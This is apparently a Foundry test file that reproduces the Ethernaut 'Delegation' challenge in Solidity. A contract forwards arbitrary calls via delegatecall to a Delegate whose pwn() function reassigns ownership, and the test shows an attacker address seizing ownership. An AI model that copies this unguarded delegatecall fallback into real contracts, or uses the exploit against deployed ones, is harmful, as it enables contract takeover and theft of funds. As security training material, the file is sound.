// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@forge-std/Test.sol";
import "@forge-std/console.sol";

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    // invoke fallback when we don't recognise the function sig
    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract TestAttack is Test {
    address attacker = address(0xBeef);

    function testAttack() public {
        Delegate delegate = new Delegate(address(this));
        Delegation delegation = new Delegation(address(delegate));

        vm.startPrank(attacker);

        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);
        address(delegation).call(data);

        vm.stopPrank();

        assertEq(delegation.owner(), attacker);
    }
}
